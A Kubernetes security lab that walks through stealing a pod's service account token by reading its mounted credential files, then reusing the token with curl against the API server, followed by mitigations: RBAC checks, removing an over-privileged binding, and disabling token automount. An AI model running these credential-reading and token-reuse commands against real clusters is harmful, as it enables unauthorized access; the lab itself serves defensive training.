# Identity theft

In this lab you will steal the identity of a pod.

## Attack

### Getting the credentials

```bash
# verify the sensitive data in the pod
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

### Exploiting the API-Server

```bash
# store the token into an env variable
TOKEN=$(kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# store the CA into a file
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt

# get infos about pods
curl -s $API_SERVER/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN" --cacert ca.crt
```

> Note, as long you have these sensitive informations you can do also a curl to the api-server from the outside, as soon you expose the api-server to the outside.

## Avoiding the Attack

### Checking the permissions

```bash
# check permissions in the default namespace
kubectl auth can-i delete pods
kubectl auth can-i --list

# check the clusterrolebinding
kubectl describe clusterrolebinding my-suboptimal-clusterrolebinding

# check the permissions of the cluster role
kubectl describe clusterrole cluster-admin
```

### Disable permissions

```bash
# disable permissions
kubectl delete clusterrolebinding my-suboptimal-clusterrolebinding

# try to get infos about pods - now this should fail
curl -s $API_SERVER/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN" --cacert ca.crt
```

### Avoiding token mounts

Disable automount of ServiceAccount Token in the file `pod.yaml`

```yaml
spec:
  automountServiceAccountToken: false # <= disable automount of ServiceAccount Token
```

```bash
kubectl apply -f pod.yaml --force
```

#### Verify sensible data is not mounted anymore

```bash
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl exec -it my-suboptimal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

#### ServiceAccountToken

Note that you can avoid mounting these sensitive informations also on ServiceAccount level.

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-service-account
automountServiceAccountToken: false
```
